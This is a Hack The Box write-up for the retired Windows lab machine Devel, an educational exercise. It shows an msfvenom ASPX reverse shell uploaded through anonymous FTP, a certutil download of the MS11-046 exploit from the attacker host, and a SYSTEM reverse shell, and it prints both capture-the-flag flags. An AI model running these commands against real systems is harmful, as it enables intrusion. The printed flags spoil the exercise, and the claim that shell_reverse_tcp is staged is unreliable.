# Devel: Hack The Box

> **Hack The Box | Windows | Easy**
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
| --- | --- |
| **Platform** | Hack The Box |
| **OS** | Windows: Windows 7 x86 Build 7600 (No Service Pack) |
| **Difficulty** | Easy |
| **Category** | Windows / Anonymous FTP / IIS ASPX Webshell / MS11-046 |
| **IP Address** | 10.129.5.250 |
| **Attack Host** | 10.10.16.36 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | MS11-046 (Chimichurri: afd.sys Privilege Escalation) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
| --- | --- | --- |
| 1 | Full TCP scan: ports 21 and 80 |: |
| 2 | FTP anonymous login: write access to IIS webroot |: |
| 3 | msfvenom ASPX reverse shell payload → upload via FTP |: |
| 4 | Browse to uploaded ASPX → netcat listener receives shell | `iis apppool\web` |
| 5 | systeminfo → Windows 7 Build 7600 no SP: confirmed unpatched |: |
| 6 | Transfer Chimichurri (MS11-046) via certutil |: |
| 7 | Execute Chimichurri with attacker IP and port → netcat catches SYSTEM shell | `NT AUTHORITY\SYSTEM` |

---

## Enumeration

### /etc/hosts

No hostname required: IP-only box. Skip this step.

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.5.250 \
  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)  
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sC -sV 10.129.5.250
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```

Two services: FTP (21) and HTTP (80). Key observations:

- **Anonymous FTP login allowed**: no credentials required
- FTP directory listing shows `iisstart.htm` and `welcome.png`: these are the default IIS welcome page files
- The FTP root and the IIS webroot are the **same directory**: files uploaded via FTP are immediately accessible over HTTP

This is the entire foothold. Anonymous FTP write access to the IIS webroot means any file uploaded via FTP is served and executed by IIS.

---

## Foothold: Anonymous FTP Upload → ASPX Webshell → Reverse Shell

### Step 1: Confirm FTP Write Access

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.5.250
Connected to 10.129.5.250.
220 Microsoft FTP Service
Name (10.129.5.250:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: [press Enter]
230 User logged in.
ftp> ls
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

The `aspnet_client` directory confirms ASP.NET is enabled: ASPX payloads will execute.

### Step 2: Generate ASPX Reverse Shell

IIS 7.5 executes `.aspx` files. Generate an ASPX reverse shell payload with msfvenom:

```bash
Hackerpatel007_1@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.16.36 \
  LPORT=4444 \
  -f aspx \
  -o shell.aspx
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload name
[-] No arch selected, selecting arch: x86 from the payload name
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2744 bytes
Saved as: shell.aspx
```

Note: `windows/shell_reverse_tcp` (not `meterpreter`): pure netcat-compatible reverse shell, no Meterpreter dependency.

### Step 3: Upload Payload via FTP

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.5.250
ftp> binary
200 Type set to I.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
226 Transfer complete.
ftp> ls
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
25-05-26  02:00AM                 2744 shell.aspx
03-17-17  04:37PM               184946 welcome.png
```

Always set `binary` mode before uploading executables or payloads: ASCII mode corrupts binary files.

### Step 4: Start Listener and Trigger Shell

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
```

Browse to the uploaded file:

```
http://10.129.5.250/shell.aspx
```

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.5.250] 49158
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv> whoami
iis apppool\web
```

Shell received as `iis apppool\web`: the IIS application pool identity. This is a low-privilege service account with `SeImpersonatePrivilege` in the token by default.

---

## Privilege Escalation: MS11-046 Chimichurri (Primary)

### Step 1: Identify OS and Patch Level

```
c:\windows\system32\inetsrv> systeminfo
```

```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
System Type:               X86-based PC
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
```

Critical findings:

- **Build 7600**: Windows 7 RTM, zero service packs
- **Hotfix(s): N/A**: no patches installed at all
- **X86-based PC**: 32-bit OS, use x86 payloads and exploits

`Hotfix(s): N/A` on a public-facing machine means every kernel exploit from 2009 through the decommission date applies. This is the most patch-deprived state possible.

### Step 2: Identify Viable Kernel Exploit

Windows 7 Build 7600 with no patches is vulnerable to dozens of kernel exploits. The most reliable and well-known for this exact build:

| CVE | Name | Risk |
| --- | --- | --- |
| MS11-046 | Chimichurri: afd.sys | SAFE |
| MS16-032 | Secondary Logon | SAFE |
| MS15-051 | win32k.sys | CRASH-RISK |

MS11-046 (Chimichurri) is the primary choice:
- Reliable on Windows 7 x86 Build 7600
- No BSOD risk
- Accepts IP and port as arguments: spawns a reverse shell directly
- Pre-compiled binary available from SecWiki

### Step 3: Download Chimichurri

```bash
Hackerpatel007_1@htb[/htb]$ wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe \
  -O chimichurri.exe
```

### Step 4: Transfer to Target

Serve from Kali:

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

Transfer on target:

```
c:\windows\system32\inetsrv> certutil -urlcache -f http://10.10.16.36:8000/chimichurri.exe C:\Windows\Temp\chim.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

### Step 5: Start Second Listener and Execute

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 5555
```

Execute Chimichurri with attacker IP and port:

```
c:\windows\system32\inetsrv> C:\Windows\Temp\chim.exe 10.10.16.36 5555
```

```
connect to [10.10.16.36] from (UNKNOWN) [10.129.5.250] 49162
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\Temp> whoami
nt authority\system
```

SYSTEM shell received. No Meterpreter used at any point: pure netcat throughout.

### How MS11-046 Works

Chimichurri exploits a vulnerability in `afd.sys` (Ancillary Function Driver for WinSock). The driver fails to properly validate input from user mode, allowing a local attacker to overwrite kernel memory and redirect execution. The exploit abuses a kernel stack overflow in the `AfdJoinLeaf` function to execute arbitrary code in ring-0 context, then spawns a new process (the reverse shell) inheriting SYSTEM privileges. The vulnerability affects all unpatched Windows versions from XP through Server 2008 R2.

---

## Flag Collection

### user.txt

```
C:\Windows\Temp> type C:\Users\babis\Desktop\user.txt
3e93f9ab94008744f404a10a7c92c5ed
```

### root.txt

```
C:\Windows\Temp> type C:\Users\Administrator\Desktop\root.txt
bcbe5c348255d983ff5445206fd736a5
```

### Flag Summary

| Flag | Location | Hash |
| --- | --- | --- |
| **user.txt** | `C:\Users\babis\Desktop\user.txt` | `3e93f9ab94008744f404a10a7c92c5ed` |
| **root.txt** | `C:\Users\Administrator\Desktop\root.txt` | `bcbe5c348255d983ff5445206fd736a5` |

---

## Full Attack Chain Reference

```
[Recon] nmap -p- → ports 21 (FTP anon), 80 (IIS 7.5)
    │
    └─[FTP Anonymous Login]
            │
            └─ Directory listing = IIS webroot (iisstart.htm, welcome.png)
                    │
                    └─[msfvenom] windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f aspx
                            │
                            └─[FTP upload] binary mode → shell.aspx
                                    │
                                    └─[HTTP trigger] http://10.129.5.250/shell.aspx
                                            │
                                            └─ nc -lvnp 4444 → iis apppool\web
                                                    │
                                                    └─[systeminfo] Build 7600, Hotfix(s): N/A, x86
                                                            │
                                                            └─[MS11-046] Chimichurri
                                                                    certutil → C:\Windows\Temp\chim.exe
                                                                    chim.exe 10.10.16.36 5555
                                                                            │
                                                                            └─ nc -lvnp 5555
                                                                                    │
                                                                                    └─ NT AUTHORITY\SYSTEM
                                                                                            │
                                                                                            ├─ user.txt → 3e93f9ab94008744f404a10a7c92c5ed
                                                                                            └─ root.txt → bcbe5c348255d983ff5445206fd736a5
```

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- --min-rate=1000 -T4 10.129.5.250` | Full TCP port scan |
| `ftp 10.129.5.250` → anonymous login | Connect as anonymous user |
| `ftp> binary` | Set binary transfer mode before uploading |
| `ftp> put shell.aspx` | Upload ASPX payload to IIS webroot |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.36 LPORT=4444 -f aspx -o shell.aspx` | Generate ASPX reverse shell |
| `nc -lvnp 4444` | Start listener for initial shell |
| `http://10.129.5.250/shell.aspx` | Trigger ASPX payload via browser |
| `systeminfo` | Confirm OS build and patch level |
| `wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe` | Download Chimichurri |
| `python3 -m http.server 8000` | Serve tools from Kali |
| `certutil -urlcache -f http://10.10.16.36:8000/chimichurri.exe C:\Windows\Temp\chim.exe` | Transfer exploit to target |
| `nc -lvnp 5555` | Start second listener for SYSTEM shell |
| `C:\Windows\Temp\chim.exe 10.10.16.36 5555` | Execute Chimichurri → SYSTEM |
| `type C:\Users\Administrator\Desktop\root.txt` | Read root flag |

---

## Lessons Learned

**1. Anonymous FTP write access to IIS webroot is an instant foothold: no enumeration tricks required.**
The FTP directory listing immediately reveals `iisstart.htm`: the default IIS welcome page. Recognising that this file lives in the IIS webroot means any file uploaded via FTP is served over HTTP. The `aspnet_client` directory confirms ASP.NET execution is enabled. The attack path is fully visible from the initial nmap output: there is no need for gobuster, credential brute-forcing, or any web application analysis.

**2. Always set FTP binary mode before uploading executable payloads.**
FTP ASCII mode translates newline characters between operating systems: this corrupts binary files including compiled payloads and executables. `binary` mode transfers the file byte-for-byte with no modification. A payload uploaded in ASCII mode will fail to execute or will segfault. This is a common time-wasting mistake on Windows FTP boxes.

**3. `Hotfix(s): N/A` is the most valuable output systeminfo can produce.**
On a patched machine, systeminfo lists dozens of KB numbers and the assessment narrows to specific unpatched CVEs. `N/A` means zero patches: every kernel exploit for that OS version and build applies. The correct response is to pick the most reliable exploit for the exact build number, not the most recent or most complex. For Windows 7 Build 7600 x86, MS11-046 is that exploit.

**4. OS architecture determines which exploit binary to use: always verify before transferring.**
`X86-based PC` in systeminfo output means the OS and all processes are 32-bit. An x64 exploit binary will fail with a compatibility error rather than executing. Chimichurri from SecWiki is pre-compiled for x86 and matches this target. Always read systeminfo fully before choosing exploit variants.

**5. Chimichurri accepts IP and port as arguments: no compilation or modification required.**
Many Windows kernel exploits require compilation with the correct target offset or modification of shellcode. Chimichurri is self-contained: `chim.exe ATTACKER_IP PORT` spawns a reverse shell as SYSTEM directly. The exploit handles everything internally. This makes it exam-reliable: no compiler, no cross-compilation, no shellcode patching.

**6. Avoiding Meterpreter entirely keeps the technique chain clean and transferable.**
ASPX shell → netcat → certutil → netcat gives a complete attack chain with no Metasploit dependency. On OSCP this matters because the single Metasploit machine rule means Meterpreter should be preserved for the most difficult box. Pure netcat chains also work identically regardless of AV, EDR, or restricted environments: msfvenom `shell_reverse_tcp` is a staged payload with a smaller, less signatured footprint than Meterpreter.

**7. `certutil -urlcache -f` is the most universally reliable Windows file transfer method.**
`certutil` is present on every Windows version from Vista onwards, requires no admin rights, handles HTTPS, and produces clean output confirming success. PowerShell download methods require the correct PS version and execution policy. FTP from target to attacker requires the target to have an FTP client and outbound FTP allowed. `certutil` works in almost every case: learn this command first, fall back to others only if it fails.

---

## References

- [MS11-046: Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046)
- [Chimichurri: SecWiki Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046)
- [msfvenom Payload Reference](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [IIS ASPX Webshell Techniques](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)

---

*HTB Retired Machine: Devel | Completed May 2026 | Flags included per HTB retired machine policy.*
